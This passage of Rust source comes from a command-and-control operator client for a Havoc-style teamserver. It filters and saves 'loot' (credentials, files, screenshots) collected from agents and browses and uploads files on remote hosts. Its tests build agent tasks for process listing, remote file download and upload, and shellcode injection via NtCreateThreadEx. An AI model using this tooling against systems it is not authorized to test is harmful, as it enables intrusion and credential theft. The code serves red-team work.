    if value.chars().count() <= max_chars {
        return value.to_owned();
    }

    let mut output = String::new();
    for (index, ch) in value.chars().enumerate() {
        if index + 1 >= max_chars {
            break;
        }
        output.push(ch);
    }
    output.push_str("...");
    output
}

fn loot_matches_filters(
    item: &LootItem,
    type_filter: LootTypeFilter,
    agent_filter: &str,
    time_filter: &str,
    text_filter: &str,
) -> bool {
    if !matches_loot_type_filter(item, type_filter) {
        return false;
    }

    contains_ascii_case_insensitive(&item.agent_id, agent_filter)
        && contains_ascii_case_insensitive(&item.collected_at, time_filter)
        && [
            item.name.as_str(),
            item.source.as_str(),
            item.agent_id.as_str(),
            item.file_path.as_deref().unwrap_or_default(),
            item.preview.as_deref().unwrap_or_default(),
        ]
        .into_iter()
        .any(|field| contains_ascii_case_insensitive(field, text_filter))
}

fn matches_loot_type_filter(item: &LootItem, type_filter: LootTypeFilter) -> bool {
    match type_filter {
        LootTypeFilter::All => true,
        LootTypeFilter::Credentials => matches!(item.kind, LootKind::Credential),
        LootTypeFilter::Files => matches!(item.kind, LootKind::File),
        LootTypeFilter::Screenshots => matches!(item.kind, LootKind::Screenshot),
    }
}

fn contains_ascii_case_insensitive(haystack: &str, needle: &str) -> bool {
    let trimmed = needle.trim();
    trimmed.is_empty() || haystack.to_ascii_lowercase().contains(&trimmed.to_ascii_lowercase())
}

fn loot_is_downloadable(item: &LootItem) -> bool {
    matches!(item.kind, LootKind::File | LootKind::Screenshot) && item.content_base64.is_some()
}

fn download_loot_item(item: &LootItem) -> std::result::Result<String, String> {
    let Some(encoded) = &item.content_base64 else {
        return Err("This loot item does not include downloadable content.".to_owned());
    };
    let bytes = base64::engine::general_purpose::STANDARD
        .decode(encoded)
        .map_err(|error| format!("Failed to decode loot payload: {error}"))?;
    let file_name = derive_download_file_name(item);
    let output_dir = dirs::download_dir().unwrap_or_else(std::env::temp_dir);
    let output_path = next_available_path(&output_dir.join(file_name));
    std::fs::write(&output_path, bytes)
        .map_err(|error| format!("Failed to save loot file: {error}"))?;
    Ok(format!("Saved {}", output_path.display()))
}

fn derive_download_file_name(item: &LootItem) -> String {
    let candidate = item
        .file_path
        .as_deref()
        .and_then(|path| std::path::Path::new(path).file_name())
        .and_then(|value| value.to_str())
        .unwrap_or(item.name.as_str());
    sanitize_file_name(candidate)
}

fn sanitize_file_name(name: &str) -> String {
    let sanitized: String = name
        .chars()
        .map(|ch| match ch {
            '/' | '\\' | ':' | '*' | '?' | '"' | '<' | '>' | '|' => '_',
            _ => ch,
        })
        .collect();
    if sanitized.trim().is_empty() { "loot.bin".to_owned() } else { sanitized }
}

fn next_available_path(path: &std::path::Path) -> std::path::PathBuf {
    if !path.exists() {
        return path.to_path_buf();
    }

    let stem = path.file_stem().and_then(|value| value.to_str()).unwrap_or("loot");
    let extension = path.extension().and_then(|value| value.to_str()).unwrap_or_default();
    for index in 1..1000 {
        let candidate = if extension.is_empty() {
            path.with_file_name(format!("{stem}-{index}"))
        } else {
            path.with_file_name(format!("{stem}-{index}.{extension}"))
        };
        if !candidate.exists() {
            return candidate;
        }
    }

    path.to_path_buf()
}

fn blank_if_empty<'a>(value: &'a str, fallback: &'a str) -> &'a str {
    if value.trim().is_empty() { fallback } else { value }
}

fn upload_destination(
    browser: Option<&AgentFileBrowserState>,
    selected_path: Option<&str>,
) -> Option<String> {
    selected_remote_directory(browser, selected_path)
        .or_else(|| browser.and_then(|state| state.current_dir.clone()))
}

fn selected_remote_directory(
    browser: Option<&AgentFileBrowserState>,
    selected_path: Option<&str>,
) -> Option<String> {
    selected_path.and_then(|path| {
        browser.and_then(|state| {
            find_file_entry(state, path).map(|entry| {
                if entry.is_dir {
                    entry.path.clone()
                } else {
                    parent_remote_path(&entry.path).unwrap_or_else(|| entry.path.clone())
                }
            })
        })
    })
}

fn find_file_entry<'a>(
    browser: &'a AgentFileBrowserState,
    path: &str,
) -> Option<&'a FileBrowserEntry> {
    browser.directories.values().flat_map(|entries| entries.iter()).find(|entry| entry.path == path)
}

fn parent_remote_path(path: &str) -> Option<String> {
    let trimmed = path.trim_end_matches(['\\', '/']);
    if trimmed.is_empty() {
        return None;
    }

    if let Some(index) = trimmed.rfind(['\\', '/']) {
        let parent = &trimmed[..=index];
        if parent.is_empty() { None } else { Some(parent.to_owned()) }
    } else {
        None
    }
}

fn join_remote_path(base: &str, name: &str) -> String {
    if base.is_empty() {
        return name.to_owned();
    }

    let separator = if base.contains('\\') { '\\' } else { '/' };
    if base.ends_with('\\') || base.ends_with('/') {
        format!("{base}{name}")
    } else {
        format!("{base}{separator}{name}")
    }
}

fn directory_label(path: &str) -> String {
    if path.ends_with(':') || path.ends_with(":\\") || path.ends_with(":/") {
        return path.to_owned();
    }

    let trimmed = path.trim_end_matches(['\\', '/']);
    Path::new(trimmed)
        .file_name()
        .and_then(|value| value.to_str())
        .filter(|value| !value.is_empty())
        .unwrap_or(trimmed)
        .to_owned()
}

fn file_entry_label(entry: &FileBrowserEntry) -> String {
    let size = if entry.size_label.trim().is_empty() { "-" } else { entry.size_label.as_str() };
    let modified = blank_if_empty(&entry.modified_at, "-");
    let permissions = blank_if_empty(&entry.permissions, "-");
    format!("{}  [{size} | {modified} | {permissions}]", entry.name)
}

fn human_size(size_bytes: u64) -> String {
    const UNITS: [&str; 4] = ["B", "KB", "MB", "GB"];

    let mut size = size_bytes as f64;
    let mut unit = 0_usize;
    while size >= 1024.0 && unit + 1 < UNITS.len() {
        size /= 1024.0;
        unit += 1;
    }

    if unit == 0 {
        format!("{size_bytes} {}", UNITS[unit])
    } else {
        format!("{size:.1} {}", UNITS[unit])
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use clap::Parser;
    use transport::{AgentFileBrowserState, AgentSummary, FileBrowserEntry, LootItem};

    #[test]
    fn cli_uses_default_server_url() {
        let cli = Cli::parse_from(["red-cell-client"]);
        assert_eq!(cli.server, DEFAULT_SERVER_URL);
    }

    #[test]
    fn cli_accepts_custom_server_url() {
        let cli = Cli::parse_from([
            "red-cell-client",
            "--server",
            "wss://teamserver.example.test/havoc/",
        ]);
        assert_eq!(cli.server, "wss://teamserver.example.test/havoc/");
    }

    #[test]
    fn cli_accepts_scripts_dir() {
        let cli =
            Cli::parse_from(["red-cell-client", "--scripts-dir", "/tmp/red-cell-client-scripts"]);
        assert_eq!(cli.scripts_dir, Some(PathBuf::from("/tmp/red-cell-client-scripts")));
    }

    #[test]
    fn cli_accepts_tls_flags() {
        let cli = Cli::parse_from([
            "red-cell-client",
            "--ca-cert",
            "/tmp/ca.pem",
            "--cert-fingerprint",
            "abcd1234",
        ]);
        assert_eq!(cli.ca_cert, Some(PathBuf::from("/tmp/ca.pem")));
        assert_eq!(cli.cert_fingerprint.as_deref(), Some("abcd1234"));
        assert!(!cli.accept_invalid_certs);
    }

    #[test]
    fn cli_accept_invalid_certs_defaults_to_false() {
        let cli = Cli::parse_from(["red-cell-client"]);
        assert!(!cli.accept_invalid_certs);
    }

    #[test]
    fn cli_accept_invalid_certs_flag_sets_true() {
        let cli = Cli::parse_from(["red-cell-client", "--accept-invalid-certs"]);
        assert!(cli.accept_invalid_certs);
    }

    #[test]
    fn resolve_tls_prefers_cli_accept_invalid_certs() {
        let cli = Cli {
            server: DEFAULT_SERVER_URL.to_owned(),
            scripts_dir: None,
            ca_cert: Some(PathBuf::from("/tmp/ca.pem")),
            cert_fingerprint: Some("abcd".to_owned()),
            accept_invalid_certs: true,
        };
        let config = LocalConfig::default();
        assert!(matches!(
            resolve_tls_verification(&cli, &config),
            TlsVerification::DangerousSkipVerify
        ));
    }

    #[test]
    fn resolve_tls_prefers_cli_fingerprint_over_ca() {
        let cli = Cli {
            server: DEFAULT_SERVER_URL.to_owned(),
            scripts_dir: None,
            ca_cert: Some(PathBuf::from("/tmp/ca.pem")),
            cert_fingerprint: Some("abcd".to_owned()),
            accept_invalid_certs: false,
        };
        let config = LocalConfig::default();
        assert!(matches!(
            resolve_tls_verification(&cli, &config),
            TlsVerification::Fingerprint(ref fp) if fp == "abcd"
        ));
    }

    #[test]
    fn resolve_tls_falls_back_to_config_fingerprint() {
        let cli = Cli {
            server: DEFAULT_SERVER_URL.to_owned(),
            scripts_dir: None,
            ca_cert: None,
            cert_fingerprint: None,
            accept_invalid_certs: false,
        };
        let config =
            LocalConfig { cert_fingerprint: Some("configfp".to_owned()), ..LocalConfig::default() };
        assert!(matches!(
            resolve_tls_verification(&cli, &config),
            TlsVerification::Fingerprint(ref fp) if fp == "configfp"
        ));
    }

    #[test]
    fn resolve_tls_defaults_to_certificate_authority() {
        let cli = Cli {
            server: DEFAULT_SERVER_URL.to_owned(),
            scripts_dir: None,
            ca_cert: None,
            cert_fingerprint: None,
            accept_invalid_certs: false,
        };
        let config = LocalConfig::default();
        assert!(matches!(
            resolve_tls_verification(&cli, &config),
            TlsVerification::CertificateAuthority
        ));
    }

    #[test]
    fn client_app_state_initializes_placeholder_state() {
        let app_state = AppState::new("wss://127.0.0.1:40056/havoc/".to_owned());

        assert_eq!(app_state.server_url, "wss://127.0.0.1:40056/havoc/");
        assert_eq!(app_state.connection_status, ConnectionStatus::Disconnected);
        assert!(app_state.operator_info.is_none());
        assert!(app_state.agents.is_empty());
        assert!(app_state.agent_consoles.is_empty());
        assert!(app_state.process_lists.is_empty());
        assert!(app_state.listeners.is_empty());
        assert!(app_state.loot.is_empty());
        assert!(app_state.chat_messages.is_empty());
        assert!(app_state.online_operators.is_empty());
    }

    #[test]
    fn client_app_starts_in_login_phase() {
        let cli = Cli {
            server: DEFAULT_SERVER_URL.to_owned(),
            scripts_dir: None,
            ca_cert: None,
            cert_fingerprint: None,
            accept_invalid_certs: false,
        };
        let app = ClientApp::new(cli);
        assert!(matches!(app.phase, AppPhase::Login(_)));
    }

    #[test]
    fn client_app_login_state_uses_cli_default() {
        let cli = Cli {
            server: "wss://custom:1234/havoc/".to_owned(),
            scripts_dir: None,
            ca_cert: None,
            cert_fingerprint: None,
            accept_invalid_certs: false,
        };
        let app = ClientApp::new(cli);
        match &app.phase {
            AppPhase::Login(state) => {
                if app.local_config.server_url.is_none() {
                    assert_eq!(state.server_url, "wss://custom:1234/havoc/");
                }
            }
            _ => panic!("expected Login phase"),
        }
    }

    fn sample_agent(
        name_id: &str,
        hostname: &str,
        username: &str,
        elevated: bool,
        last_call_in: &str,
    ) -> AgentSummary {
        AgentSummary {
            name_id: name_id.to_owned(),
            status: "Alive".to_owned(),
            domain_name: "LAB".to_owned(),
            username: username.to_owned(),
            internal_ip: "10.0.0.10".to_owned(),
            external_ip: "203.0.113.10".to_owned(),
            hostname: hostname.to_owned(),
            process_arch: "x64".to_owned(),
            process_name: "explorer.exe".to_owned(),
            process_pid: "1234".to_owned(),
            elevated,
            os_version: "Windows 11".to_owned(),
            os_build: "22631".to_owned(),
            os_arch: "x64".to_owned(),
            sleep_delay: "5".to_owned(),
            sleep_jitter: "10".to_owned(),
            last_call_in: last_call_in.to_owned(),
            note: "primary workstation".to_owned(),
            pivot_parent: None,
            pivot_links: Vec::new(),
        }
    }

    #[test]
    fn agent_filter_matches_multiple_columns() {
        let agent = sample_agent("ABCD1234", "wkstn-1", "operator", true, "10/03/2026 12:00:00");
        assert!(agent_matches_filter(&agent, "wkstn"));
        assert!(agent_matches_filter(&agent, "primary"));
        assert!(agent_matches_filter(&agent, "10.0.0.10"));
        assert!(!agent_matches_filter(&agent, "sqlservr"));
    }

    #[test]
    fn sort_agents_orders_by_last_checkin_descending() {
        let mut agents = vec![
            sample_agent("AAAA0001", "wkstn-1", "alice", false, "10/03/2026 11:00:00"),
            sample_agent("BBBB0002", "wkstn-2", "bob", true, "10/03/2026 12:00:00"),
        ];

        sort_agents(&mut agents, AgentSortColumn::LastCheckin, true);

        assert_eq!(agents[0].name_id, "BBBB0002");
        assert_eq!(agents[1].name_id, "AAAA0001");
    }

    #[test]
    fn sort_button_label_marks_active_column() {
        assert_eq!(
            sort_button_label(Some(AgentSortColumn::Hostname), false, AgentSortColumn::Hostname),
            "Hostname ^"
        );
        assert_eq!(
            sort_button_label(Some(AgentSortColumn::Hostname), true, AgentSortColumn::Id),
            "ID"
        );
    }

    #[test]
    fn build_kill_task_uses_exit_command_shape() {
        let OperatorMessage::AgentTask(message) = build_kill_task("ABCD1234", "operator") else {
            panic!("expected agent task");
        };

        assert_eq!(message.info.demon_id, "ABCD1234");
        assert_eq!(message.info.command_id, u32::from(DemonCommand::CommandExit).to_string());
        assert_eq!(message.info.command.as_deref(), Some("kill"));
    }

    #[test]
    fn build_process_list_task_marks_process_manager_origin() {
        let OperatorMessage::AgentTask(message) = build_process_list_task("ABCD1234", "operator")
        else {
            panic!("expected agent task");
        };

        assert_eq!(message.info.command_id, u32::from(DemonCommand::CommandProcList).to_string());
        assert_eq!(
            message.info.extra.get("FromProcessManager"),
            Some(&serde_json::Value::Bool(true))
        );
    }

    #[test]
    fn build_process_injection_task_encodes_shellcode_payload() {
        let OperatorMessage::AgentTask(message) = build_process_injection_task(
            "ABCD1234",
            4444,
            "x64",
            InjectionTechnique::NtCreateThreadEx,
            &[0x90, 0x90, 0xCC],
            "--flag",
            InjectionTargetAction::Inject,
            "operator",
        ) else {
            panic!("expected agent task");
        };

        assert_eq!(
            message.info.command_id,
            u32::from(DemonCommand::CommandInjectShellcode).to_string()
        );
        assert_eq!(
            message.info.extra.get("Technique"),
            Some(&serde_json::Value::String("ntcreatethreadex".to_owned()))
        );
        assert_eq!(
            message.info.extra.get("Binary"),
            Some(&serde_json::Value::String("kJDM".to_owned()))
        );
        assert_eq!(
            message.info.extra.get("Arguments"),
            Some(&serde_json::Value::String("LS1mbGFn".to_owned()))
        );
    }

    #[test]
    fn build_note_task_uses_teamserver_note_shape() {
        let OperatorMessage::AgentTask(message) =
            build_note_task("ABCD1234", "triaged", "operator")
        else {
            panic!("expected agent task");
        };

        assert_eq!(message.head.user, "operator");
        assert_eq!(message.info.demon_id, "ABCD1234");
        assert_eq!(message.info.command_id, "Teamserver");
        assert_eq!(message.info.command.as_deref(), Some("note"));
        assert_eq!(message.info.arguments.as_deref(), Some("triaged"));
    }

    #[test]
    fn build_chat_message_uses_chat_wire_shape() {
        let Some(OperatorMessage::ChatMessage(message)) =
            build_chat_message(Some("operator"), " hello team ")
        else {
            panic!("expected chat message");
        };

        assert_eq!(message.head.event, EventCode::Chat);
        assert_eq!(
            message.info.fields.get("Message"),
            Some(&serde_json::Value::String("hello team".to_owned()))
        );
    }

    #[test]
    fn build_console_task_encodes_filesystem_download() {
        let OperatorMessage::AgentTask(message) =
            build_console_task("ABCD1234", "download C:\\Temp\\report.txt", "operator")
                .unwrap_or_else(|error| panic!("console task should build: {error}"))
        else {
            panic!("expected agent task");
        };

        assert_eq!(message.info.command_id, u32::from(DemonCommand::CommandFs).to_string());
        assert_eq!(message.info.sub_command.as_deref(), Some("download"));
        assert_eq!(message.info.arguments.as_deref(), Some("QzpcVGVtcFxyZXBvcnQudHh0"));
    }

    #[test]
    fn file_browser_list_task_uses_explorer_arguments() {
        let OperatorMessage::AgentTask(message) =
            build_file_browser_list_task("ABCD1234", "C:\\Temp", "operator")
        else {
            panic!("expected agent task");
        };

        assert_eq!(message.info.command_id, u32::from(DemonCommand::CommandFs).to_string());
        assert_eq!(message.info.sub_command.as_deref(), Some("dir"));
        assert_eq!(message.info.arguments.as_deref(), Some("C:\\Temp;true;false;false;false;;;"));
    }

    #[test]
    fn file_browser_upload_task_encodes_remote_path_and_content() {
        let OperatorMessage::AgentTask(message) = build_file_browser_upload_task(
            "ABCD1234",
            "C:\\Temp\\report.txt",
            b"hello",
            "operator",
        ) else {
            panic!("expected agent task");
        };

        assert_eq!(message.info.sub_command.as_deref(), Some("upload"));
        assert_eq!(message.info.arguments.as_deref(), Some("QzpcVGVtcFxyZXBvcnQudHh0;aGVsbG8="));
    }

    #[test]
    fn build_console_task_rejects_missing_process_kill_pid() {
        let error = build_console_task("ABCD1234", "proc kill", "operator")
            .expect_err("missing pid should fail");
        assert_eq!(error, "Usage: proc kill <pid>");
    }

    #[test]
    fn filtered_process_rows_matches_name_and_pid() {
        let rows = vec![
            ProcessEntry {
                pid: 1010,
                ppid: 4,
                name: "explorer.exe".to_owned(),
                arch: "x64".to_owned(),
                user: "LAB\\operator".to_owned(),
                session: 1,
            },
            ProcessEntry {
                pid: 2020,
                ppid: 4,
                name: "svchost.exe".to_owned(),
                arch: "x64".to_owned(),
                user: "SYSTEM".to_owned(),
                session: 0,
            },
        ];

        assert_eq!(filtered_process_rows(&rows, "explorer").len(), 1);
        assert_eq!(filtered_process_rows(&rows, "2020").len(), 1);
        assert_eq!(filtered_process_rows(&rows, "missing").len(), 0);
    }

    #[test]
    fn normalized_process_arch_maps_unknown_values_to_x64() {
        assert_eq!(normalized_process_arch("x86"), "x86");
        assert_eq!(normalized_process_arch("WOW64"), "x64");
    }

    #[test]
    fn history_navigation_walks_commands_and_resets() {
        let mut console = AgentConsoleState::default();
        push_history_entry(&mut console, "ps");
        push_history_entry(&mut console, "pwd");

        apply_history_step(&mut console, HistoryDirection::Older);
        assert_eq!(console.input, "pwd");

        apply_history_step(&mut console, HistoryDirection::Older);
        assert_eq!(console.input, "ps");

        apply_history_step(&mut console, HistoryDirection::Newer);
        assert_eq!(console.input, "pwd");

        apply_history_step(&mut console, HistoryDirection::Newer);
        assert!(console.input.is_empty());
    }

    #[test]
    fn completion_cycles_supported_commands() {
        let mut console =
            AgentConsoleState { input: "p".to_owned(), ..AgentConsoleState::default() };

        apply_completion(&mut console);
        assert_eq!(console.input, "ps");

        apply_completion(&mut console);
        assert_eq!(console.input, "pwd");

        apply_completion(&mut console);
        assert_eq!(console.input, "proc");
    }

    #[test]
    fn split_console_selection_prefers_selected_agent() {
        let open = vec!["A".to_owned(), "B".to_owned(), "C".to_owned()];
        let visible = split_console_selection(&open, Some("C"));
        assert_eq!(visible, vec!["C", "A"]);
    }

    #[test]
    fn build_session_graph_uses_explicit_pivot_parent() {
        let mut child = sample_agent("BBBB0002", "wkstn-2", "bob", false, "10/03/2026 12:01:00");
        child.pivot_parent = Some("AAAA0001".to_owned());
        let agents =
            vec![sample_agent("AAAA0001", "wkstn-1", "alice", false, "10/03/2026 12:00:00"), child];

        let graph = build_session_graph(&agents);

        assert!(graph.edges.iter().any(|edge| edge.from == "AAAA0001" && edge.to == "BBBB0002"));
        assert!(
            graph
                .edges
                .iter()
                .any(|edge| edge.from == SESSION_GRAPH_ROOT_ID && edge.to == "AAAA0001")
        );
    }

    #[test]
    fn build_session_graph_falls_back_to_pivot_links() {
        let mut parent = sample_agent("AAAA0001", "wkstn-1", "alice", false, "10/03/2026 12:00:00");
        parent.pivot_links.push("BBBB0002".to_owned());
        let child = sample_agent("BBBB0002", "wkstn-2", "bob", false, "10/03/2026 12:01:00");

        let graph = build_session_graph(&[parent, child]);

        assert!(graph.edges.iter().any(|edge| edge.from == "AAAA0001" && edge.to == "BBBB0002"));
    }

    #[test]
    fn agent_is_active_status_matches_expected_markers() {
        assert!(agent_is_active_status("Alive"));
        assert!(agent_is_active_status("true"));
        assert!(!agent_is_active_status("Dead"));
        assert!(!agent_is_active_status("Offline"));
    }

    #[test]
    fn loot_filter_matches_type_agent_and_text() {
        let item = LootItem {
            kind: LootKind::Screenshot,
            name: "desktop.png".to_owned(),
            agent_id: "ABCD1234".to_owned(),
            source: "download".to_owned(),
            collected_at: "2026-03-10T12:00:00Z".to_owned(),
            file_path: Some("C:/Temp/desktop.png".to_owned()),
            size_bytes: Some(1024),
            content_base64: None,
            preview: Some("primary desktop".to_owned()),
        };

        assert!(loot_matches_filters(
            &item,
            LootTypeFilter::Screenshots,
            "abcd",
            "2026-03-10",
            "desktop"
        ));
        assert!(!loot_matches_filters(&item, LootTypeFilter::Credentials, "", "", ""));
    }

    #[test]
    fn sanitize_file_name_replaces_invalid_characters() {
        assert_eq!(sanitize_file_name("C:\\Temp\\report?.txt"), "C__Temp_report_.txt");
    }

    #[test]
    fn parent_remote_path_returns_windows_parent() {
        assert_eq!(parent_remote_path("C:\\Temp\\report.txt").as_deref(), Some("C:\\Temp\\"));
    }

    #[test]
    fn upload_destination_prefers_selected_directory() {
        let browser = AgentFileBrowserState {
            current_dir: Some("C:\\Temp".to_owned()),
            directories: BTreeMap::from([(
                "C:\\Temp".to_owned(),
                vec![FileBrowserEntry {
                    name: "Logs".to_owned(),
                    path: "C:\\Temp\\Logs".to_owned(),
                    is_dir: true,
                    size_label: String::new(),
                    size_bytes: None,
                    modified_at: String::new(),
                    permissions: String::new(),
                }],
            )]),
            ..AgentFileBrowserState::default()
        };

        assert_eq!(
            upload_destination(Some(&browser), Some("C:\\Temp\\Logs")).as_deref(),
            Some("C:\\Temp\\Logs")
        );
    }

    #[test]
    fn selected_remote_directory_uses_parent_for_selected_file() {
        let browser = AgentFileBrowserState {
            current_dir: Some("C:\\Temp".to_owned()),
            directories: BTreeMap::from([(
                "C:\\Temp".to_owned(),
                vec![FileBrowserEntry {
                    name: "report.txt".to_owned(),
                    path: "C:\\Temp\\report.txt".to_owned(),
                    is_dir: false,
                    size_label: "5 B".to_owned(),
                    size_bytes: Some(5),
                    modified_at: String::new(),
                    permissions: String::new(),
                }],
            )]),
            ..AgentFileBrowserState::default()
        };

        assert_eq!(
            selected_remote_directory(Some(&browser), Some("C:\\Temp\\report.txt")).as_deref(),
            Some("C:\\Temp\\")
        );
    }

    #[test]
    fn selected_remote_directory_returns_none_without_matching_entry() {
        let browser = AgentFileBrowserState::default();
        assert!(selected_remote_directory(Some(&browser), Some("C:\\Missing")).is_none());
    }
}
